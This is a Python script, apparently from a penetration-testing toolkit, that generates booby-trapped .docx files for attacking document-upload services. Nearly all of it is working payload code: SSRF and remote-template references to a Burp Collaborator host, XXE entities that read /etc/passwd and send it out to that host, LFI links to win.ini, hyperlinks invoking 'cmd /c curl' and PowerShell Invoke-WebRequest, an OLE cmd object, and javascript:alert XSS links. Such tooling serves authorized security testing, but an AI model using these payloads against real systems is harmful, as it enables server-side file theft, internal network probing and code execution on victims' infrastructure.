import zipfile
import shutil
from pathlib import Path
from docx import Document
import xml.etree.ElementTree as ET

try:
    from .ssti_filename_generator import generate_ssti_filename_payloads
    from .xss_filename_generator import generate_xss_filename_payloads
except ImportError:
    try:
        from ssti_filename_generator import generate_ssti_filename_payloads
        from xss_filename_generator import generate_xss_filename_payloads
    except ImportError:
        generate_ssti_filename_payloads = None
        generate_xss_filename_payloads = None

def generate_docx_payloads(output_dir, burp_collab, tech_filter='all', payload_types=None):
    if payload_types is None:
        payload_types = {'all'}
    
    def should_generate_type(payload_type):
        return 'all' in payload_types or payload_type in payload_types
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    if should_generate_type('ssrf'):
        ssrf_dir = output_dir / 'ssrf'
        ssrf_dir.mkdir(exist_ok=True)
    if should_generate_type('lfi'):
        lfi_dir = output_dir / 'lfi'
        lfi_dir.mkdir(exist_ok=True)
    if should_generate_type('xxe'):
        xxe_dir = output_dir / 'xxe'
        xxe_dir.mkdir(exist_ok=True)
    if should_generate_type('rce') or should_generate_type('deserialization'):
        rce_dir = output_dir / 'rce'
        rce_dir.mkdir(exist_ok=True)
    if should_generate_type('xss'):
        xss_dir = output_dir / 'xss'
        xss_dir.mkdir(exist_ok=True)
    
    def create_docx_with_rels(docx_path, rels_content, rels_path="word/_rels/document.xml.rels"):
        doc = Document()
        doc.add_paragraph('Test')
        doc.save(docx_path)
        
        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            temp_dir = output_dir / f"temp_{docx_path.stem}"
            zip_ref.extractall(temp_dir)
        
        target_path = temp_dir / rels_path
        target_path.parent.mkdir(parents=True, exist_ok=True)
        with open(target_path, 'w', encoding='utf-8') as f:
            f.write(rels_content)
        
        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    rels_template = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="{}" TargetMode="External"/>
</Relationships>'''
    
    if should_generate_type('ssrf'):
        docx_ssrf1_document_rels = rels_template.format(f"{base_url}/h1")
        create_docx_with_rels(ssrf_dir / "ssrf1_document_rels.docx", docx_ssrf1_document_rels, "word/_rels/document.xml.rels")
        
        docx_ssrf2_header_rels = rels_template.format(f"{base_url}/h2")
        create_docx_with_rels(ssrf_dir / "ssrf2_header_rels.docx", docx_ssrf2_header_rels, "word/_rels/header1.xml.rels")
        
        doc = Document()
        doc.add_paragraph('Test')
        docx_path = ssrf_dir / "ssrf3_images_remote.docx"
        doc.save(docx_path)
        
        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_ssrf3"
            zip_ref.extractall(temp_dir)
        
        document_xml_path = temp_dir / "word" / "document.xml"
        if document_xml_path.exists():
            tree = ET.parse(document_xml_path)
            root = tree.getroot()
            
            ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main',
                  'a': 'http://schemas.openxmlformats.org/drawingml/2006/main',
                  'r': 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'}
            
            for p in root.findall('.//w:p', ns):
                r = ET.SubElement(p, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r')
                drawing = ET.SubElement(r, '{http://schemas.openxmlformats.org/drawingml/2006/main}drawing')
                inline = ET.SubElement(drawing, '{http://schemas.openxmlformats.org/drawingml/2006/main}inline')
                graphic = ET.SubElement(inline, '{http://schemas.openxmlformats.org/drawingml/2006/main}graphic')
                graphicData = ET.SubElement(graphic, '{http://schemas.openxmlformats.org/drawingml/2006/main}graphicData')
                pic = ET.SubElement(graphicData, '{http://schemas.openxmlformats.org/drawingml/2006/picture}pic')
                blipFill = ET.SubElement(pic, '{http://schemas.openxmlformats.org/drawingml/2006/picture}blipFill')
                blip = ET.SubElement(blipFill, '{http://schemas.openxmlformats.org/drawingml/2006/main}blip')
                blip.set('{http://schemas.openxmlformats.org/officeDocument/2006/relationships}link', 'rId666')
                break
            
            tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
            
            rels_path = temp_dir / "word" / "_rels" / "document.xml.rels"
            rels_content = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId666" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{base_url}/img1.png" TargetMode="External"/>
</Relationships>'''
            with open(rels_path, 'w', encoding='utf-8') as f:
                f.write(rels_content)
            
            with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_dir.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_dir)
                        zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    docx_ssrf4_websettings = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:webSettings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<w:attachedTemplate r:id="rId1"/>
</w:webSettings>'''
    
    if should_generate_type('ssrf'):
        doc = Document()
        doc.save(ssrf_dir / "ssrf4_websettings.docx")
        with zipfile.ZipFile(ssrf_dir / "ssrf4_websettings.docx", 'r') as zip_ref:
            temp_dir = output_dir / "temp_ssrf4"
            zip_ref.extractall(temp_dir)
        
        websettings_path = temp_dir / "word" / "webSettings.xml"
        with open(websettings_path, 'w', encoding='utf-8') as f:
            f.write(docx_ssrf4_websettings)
        
        rels_path = temp_dir / "word" / "_rels" / "webSettings.xml.rels"
        rels_path.parent.mkdir(parents=True, exist_ok=True)
        with open(rels_path, 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{base_url}/evil.dotm" TargetMode="External"/>
</Relationships>''')
        
        with zipfile.ZipFile(ssrf_dir / "ssrf4_websettings.docx", 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        doc = Document()
        doc.save(ssrf_dir / "ssrf5_customxml.docx")
        with zipfile.ZipFile(ssrf_dir / "ssrf5_customxml.docx", 'r') as zip_ref:
            temp_dir = output_dir / "temp_ssrf5"
            zip_ref.extractall(temp_dir)
        
        customxml_dir = temp_dir / "customXml"
        customxml_dir.mkdir(exist_ok=True)
        with open(customxml_dir / "item1.xml", 'w', encoding='utf-8') as f:
            f.write('<?xml version="1.0"?><root>test</root>')
        
        rels_path = customxml_dir / "_rels" / "item1.xml.rels"
        rels_path.parent.mkdir(parents=True, exist_ok=True)
        with open(rels_path, 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="{base_url}/schema.xsd" TargetMode="External"/>
</Relationships>''')
        
        with zipfile.ZipFile(ssrf_dir / "ssrf5_customxml.docx", 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    docx_lfi7_websettings = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:webSettings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<w:attachedTemplate r:id="rId1"/>
</w:webSettings>'''
    
    if should_generate_type('lfi'):
        doc = Document()
        doc.save(lfi_dir / "lfi7_websettings.docx")
        with zipfile.ZipFile(lfi_dir / "lfi7_websettings.docx", 'r') as zip_ref:
            temp_dir = output_dir / "temp_lfi7"
            zip_ref.extractall(temp_dir)
        
        websettings_path = temp_dir / "word" / "webSettings.xml"
        with open(websettings_path, 'w', encoding='utf-8') as f:
            f.write(docx_lfi7_websettings)
        
        rels_path = temp_dir / "word" / "_rels" / "webSettings.xml.rels"
        rels_path.parent.mkdir(parents=True, exist_ok=True)
        with open(rels_path, 'w', encoding='utf-8') as f:
            f.write('''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///c:/windows/win.ini" TargetMode="External"/>
</Relationships>''')
        
        with zipfile.ZipFile(lfi_dir / "lfi7_websettings.docx", 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    if should_generate_type('xxe'):
        doc = Document()
        doc.add_paragraph('Test')
        docx_path = xxe_dir / "xxe8_customxml.docx"
        doc.save(docx_path)
        
        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_xxe8"
            zip_ref.extractall(temp_dir)
        
        customxml_dir = temp_dir / "customXml"
        customxml_dir.mkdir(parents=True, exist_ok=True)
        with open(customxml_dir / "item1.xml", 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % x SYSTEM "{base_url}/xxe-docx">%x;]>
<root>test</root>''')
        
        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        doc = Document()
        doc.add_paragraph('Test')
        docx_path = xxe_dir / "xxe9_customxml_file.docx"
        doc.save(docx_path)
        
        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_xxe9"
            zip_ref.extractall(temp_dir)
        
        customxml_dir = temp_dir / "customXml"
        customxml_dir.mkdir(parents=True, exist_ok=True)
        with open(customxml_dir / "item1.xml", 'w', encoding='utf-8') as f:
            f.write('''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''')
        
        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        doc = Document()
        doc.add_paragraph('Test')
        docx_path = xxe_dir / "xxe10_customxml_param.docx"
        doc.save(docx_path)
        
        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_xxe10"
            zip_ref.extractall(temp_dir)
        
        customxml_dir = temp_dir / "customXml"
        customxml_dir.mkdir(parents=True, exist_ok=True)
        with open(customxml_dir / "item1.xml", 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "{base_url}/xxe-docx-param">
%remote;
]>
<root>&data;</root>''')
        
        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        doc = Document()
        doc.add_paragraph('Test')
        docx_path = xxe_dir / "xxe11_customxml_nested.docx"
        doc.save(docx_path)
        
        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_xxe11"
            zip_ref.extractall(temp_dir)
        
        customxml_dir = temp_dir / "customXml"
        customxml_dir.mkdir(parents=True, exist_ok=True)
        with open(customxml_dir / "item1.xml", 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "{base_url}/xxe-docx-nested">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{base_url}/xxe-docx-exfil?data=%file;'>">
%remote;
%eval;
%exfil;
]>
<root>test</root>''')
        
        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        doc = Document()
        doc.add_paragraph('Test')
        docx_path = xxe_dir / "xxe12_settings_xml.docx"
        doc.save(docx_path)
        
        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_xxe12"
            zip_ref.extractall(temp_dir)
        
        settings_path = temp_dir / "word" / "settings.xml"
        if settings_path.exists():
            with open(settings_path, 'r', encoding='utf-8') as f:
                content = f.read()
            content = content.replace('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>', 
                                    f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE settings [<!ENTITY xxe SYSTEM "{base_url}/xxe-docx-settings">]>
''')
            content = content.replace('<w:settings', '&xxe;<w:settings')
            with open(settings_path, 'w', encoding='utf-8') as f:
                f.write(content)
        
        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    if should_generate_type('rce') or should_generate_type('deserialization'):
        doc = Document()
        doc.add_paragraph('Test')
        docx_path = rce_dir / "rce1_ole_object.docx"
        doc.save(docx_path)
        
        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_rce1"
            zip_ref.extractall(temp_dir)
        
        document_xml_path = temp_dir / "word" / "document.xml"
        if document_xml_path.exists():
            tree = ET.parse(document_xml_path)
            root = tree.getroot()
            
            ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main',
                  'o': 'urn:schemas-microsoft-com:office:office',
                  'v': 'urn:schemas-microsoft-com:vml'}
            
            for p in root.findall('.//w:p', ns):
                r = ET.SubElement(p, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r')
                object_elem = ET.SubElement(r, '{urn:schemas-microsoft-com:office:office}OLEObject')
                object_elem.set('{urn:schemas-microsoft-com:office:office}ProgID', 'cmd')
                object_elem.set('{urn:schemas-microsoft-com:office:office}ShapeID', 'rIdOLE1')
                break
            
            tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
            
            rels_path = temp_dir / "word" / "_rels" / "document.xml.rels"
            rels_tree = ET.parse(rels_path)
            rels_root = rels_tree.getroot()
            
            rel = ET.SubElement(rels_root, '{http://schemas.openxmlformats.org/package/2006/relationships}Relationship')
            rel.set('Id', 'rIdOLE1')
            rel.set('Type', 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject')
            rel.set('Target', f'{base_url}/rce-docx-ole1')
            rel.set('TargetMode', 'External')
            
            rels_tree.write(rels_path, encoding='utf-8', xml_declaration=True)
        
        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        doc = Document()
        doc.add_paragraph('Test')
        docx_path = rce_dir / "rce2_hyperlink_cmd.docx"
        doc.save(docx_path)
        
        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_rce2"
            zip_ref.extractall(temp_dir)
        
        document_xml_path = temp_dir / "word" / "document.xml"
        if document_xml_path.exists():
            tree = ET.parse(document_xml_path)
            root = tree.getroot()
            
            ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main',
                  'r': 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'}
            
            for p in root.findall('.//w:p', ns):
                r = ET.SubElement(p, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r')
                hyperlink = ET.SubElement(r, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}hyperlink')
                hyperlink.set('{http://schemas.openxmlformats.org/officeDocument/2006/relationships}id', 'rIdRCE2')
                t = ET.SubElement(hyperlink, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}t')
                t.text = 'click'
                break
            
            tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
            
            rels_path = temp_dir / "word" / "_rels" / "document.xml.rels"
            rels_tree = ET.parse(rels_path)
            rels_root = rels_tree.getroot()
            
            rel = ET.SubElement(rels_root, '{http://schemas.openxmlformats.org/package/2006/relationships}Relationship')
            rel.set('Id', 'rIdRCE2')
            rel.set('Type', 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink')
            rel.set('Target', f'cmd:///c curl {base_url}/rce-docx-cmd1')
            rel.set('TargetMode', 'External')
            
            rels_tree.write(rels_path, encoding='utf-8', xml_declaration=True)
        
        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        doc = Document()
        doc.add_paragraph('Test')
        docx_path = rce_dir / "rce3_hyperlink_powershell.docx"
        doc.save(docx_path)
        
        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_rce3"
            zip_ref.extractall(temp_dir)
        
        document_xml_path = temp_dir / "word" / "document.xml"
        if document_xml_path.exists():
            tree = ET.parse(document_xml_path)
            root = tree.getroot()
            
            ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main',
                  'r': 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'}
            
            for p in root.findall('.//w:p', ns):
                r = ET.SubElement(p, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r')
                hyperlink = ET.SubElement(r, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}hyperlink')
                hyperlink.set('{http://schemas.openxmlformats.org/officeDocument/2006/relationships}id', 'rIdRCE3')
                t = ET.SubElement(hyperlink, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}t')
                t.text = 'click'
                break
            
            tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
            
            rels_path = temp_dir / "word" / "_rels" / "document.xml.rels"
            rels_tree = ET.parse(rels_path)
            rels_root = rels_tree.getroot()
            
            rel = ET.SubElement(rels_root, '{http://schemas.openxmlformats.org/package/2006/relationships}Relationship')
            rel.set('Id', 'rIdRCE3')
            rel.set('Type', 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink')
            rel.set('Target', f'powershell://Invoke-WebRequest {base_url}/rce-docx-ps1')
            rel.set('TargetMode', 'External')
            
            rels_tree.write(rels_path, encoding='utf-8', xml_declaration=True)
        
        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        doc = Document()
        doc.add_paragraph('Test')
        docx_path = rce_dir / "rce4_field_macro.docx"
        doc.save(docx_path)
        
        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_rce4"
            zip_ref.extractall(temp_dir)
        
        document_xml_path = temp_dir / "word" / "document.xml"
        if document_xml_path.exists():
            tree = ET.parse(document_xml_path)
            root = tree.getroot()
            
            ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'}
            
            for p in root.findall('.//w:p', ns):
                fldSimple = ET.SubElement(p, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}fldSimple')
                fldSimple.set('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}instr', f'HYPERLINK "{base_url}/rce-docx-field1"')
                r = ET.SubElement(fldSimple, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r')
                t = ET.SubElement(r, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}t')
                t.text = 'click'
                break
            
            tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
        
        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        doc = Document()
        doc.add_paragraph('Test')
        docx_path = rce_dir / "rce5_embedded_script.docx"
        doc.save(docx_path)
        
        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_rce5"
            zip_ref.extractall(temp_dir)
        
        document_xml_path = temp_dir / "word" / "document.xml"
        if document_xml_path.exists():
            tree = ET.parse(document_xml_path)
            root = tree.getroot()
            
            ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main',
                  'm': 'http://schemas.microsoft.com/office/2004/12/omml'}
            
            for p in root.findall('.//w:p', ns):
                r = ET.SubElement(p, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r')
                object_elem = ET.SubElement(r, '{http://schemas.microsoft.com/office/2004/12/omml}oMathPara')
                script_elem = ET.SubElement(object_elem, '{http://schemas.microsoft.com/office/2004/12/omml}oMath')
                t = ET.SubElement(script_elem, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}t')
                t.text = f'fetch("{base_url}/rce-docx-script1")'
                break
            
            tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
        
        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    if should_generate_type('xss'):
        doc = Document()
        doc.add_paragraph('Test')
        docx_path = xss_dir / "xss1_hyperlink_js.docx"
        doc.save(docx_path)
        
        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_xss1"
            zip_ref.extractall(temp_dir)
        
        document_xml_path = temp_dir / "word" / "document.xml"
        if document_xml_path.exists():
            tree = ET.parse(document_xml_path)
            root = tree.getroot()
            
            ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main',
                  'r': 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'}
            
            for p in root.findall('.//w:p', ns):
                r = ET.SubElement(p, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r')
                hyperlink = ET.SubElement(r, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}hyperlink')
                hyperlink.set('{http://schemas.openxmlformats.org/officeDocument/2006/relationships}id', 'rIdXSS1')
                t = ET.SubElement(hyperlink, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}t')
                t.text = 'click'
                break
            
            tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
            
            rels_path = temp_dir / "word" / "_rels" / "document.xml.rels"
            rels_tree = ET.parse(rels_path)
            rels_root = rels_tree.getroot()
            
            rel = ET.SubElement(rels_root, '{http://schemas.openxmlformats.org/package/2006/relationships}Relationship')
            rel.set('Id', 'rIdXSS1')
            rel.set('Type', 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink')
            rel.set('Target', 'javascript:alert(1)')
            rel.set('TargetMode', 'External')
            
            rels_tree.write(rels_path, encoding='utf-8', xml_declaration=True)
            
            with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_dir.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_dir)
                        zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        doc = Document()
        doc.add_paragraph('Test')
        docx_path = xss_dir / "xss2_field_hyperlink_js.docx"
        doc.save(docx_path)
        
        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_xss2"
            zip_ref.extractall(temp_dir)
        
        document_xml_path = temp_dir / "word" / "document.xml"
        if document_xml_path.exists():
            tree = ET.parse(document_xml_path)
            root = tree.getroot()
            
            ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'}
            
            for p in root.findall('.//w:p', ns):
                r = ET.SubElement(p, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r')
                fldChar = ET.SubElement(r, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}fldChar')
                fldChar.set('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}fldCharType', 'begin')
                instrText = ET.SubElement(r, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}instrText')
                instrText.text = ' HYPERLINK "javascript:alert(1)" '
                fldChar2 = ET.SubElement(r, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}fldChar')
                fldChar2.set('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}fldCharType', 'end')
                break
            
            tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
            
            with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_dir.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_dir)
                        zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    if should_generate_type('ssrf') or should_generate_type('xxe'):
        doc = Document()
        doc.add_paragraph('Test')
        master_path = output_dir / "master.docx"
        doc.save(master_path)
        
        with zipfile.ZipFile(master_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_master"
            zip_ref.extractall(temp_dir)
        
        document_rels_path = temp_dir / "word" / "_rels" / "document.xml.rels"
        with open(document_rels_path, 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="{base_url}/h1" TargetMode="External"/>
<Relationship Id="rId666" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{base_url}/img1.png" TargetMode="External"/>
</Relationships>''')
        
        websettings_path = temp_dir / "word" / "webSettings.xml"
        with open(websettings_path, 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:webSettings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<w:attachedTemplate r:id="rId1"/>
</w:webSettings>''')
        
        websettings_rels_path = temp_dir / "word" / "_rels" / "webSettings.xml.rels"
        websettings_rels_path.parent.mkdir(parents=True, exist_ok=True)
        with open(websettings_rels_path, 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{base_url}/evil.dotm" TargetMode="External"/>
</Relationships>''')
        
        customxml_dir = temp_dir / "customXml"
        customxml_dir.mkdir(parents=True, exist_ok=True)
        with open(customxml_dir / "item1.xml", 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % x SYSTEM "{base_url}/xxe-docx">%x;]>
<root>test</root>''')
        
        customxml_rels_path = customxml_dir / "_rels" / "item1.xml.rels"
        customxml_rels_path.parent.mkdir(parents=True, exist_ok=True)
        with open(customxml_rels_path, 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="{base_url}/schema.xsd" TargetMode="External"/>
</Relationships>''')
        
        with zipfile.ZipFile(master_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    if generate_ssti_filename_payloads and should_generate_type('ssti'):
        generate_ssti_filename_payloads(output_dir, 'docx', burp_collab, tech_filter)
    
    if generate_xss_filename_payloads and should_generate_type('xss'):
        generate_xss_filename_payloads(output_dir, 'docx', burp_collab, tech_filter)
